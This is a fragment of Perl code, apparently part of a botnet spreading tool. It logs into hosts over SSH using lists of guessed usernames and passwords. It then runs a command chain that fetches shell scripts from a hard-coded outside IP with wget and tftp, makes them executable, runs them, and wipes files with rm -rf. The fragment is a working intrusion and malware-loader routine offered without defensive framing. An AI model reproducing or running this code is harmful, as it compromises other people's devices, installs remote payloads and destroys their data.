...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /run || cd /; wget http://161.35.166.115/axisbins.sh; chmod 777 axisbins.sh; sh axisbins.sh; tftp 161.35.166.115 -c get axistftp1.sh; chmod 777 axistftp1.sh; sh axistftp1.sh; tftp -r axistftp2.sh -g 161.35.166.115; chmod 777 axistftp2.sh; sh axistftp2.sh; rm -rf axisbins.sh axistftp1.sh axistftp2.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
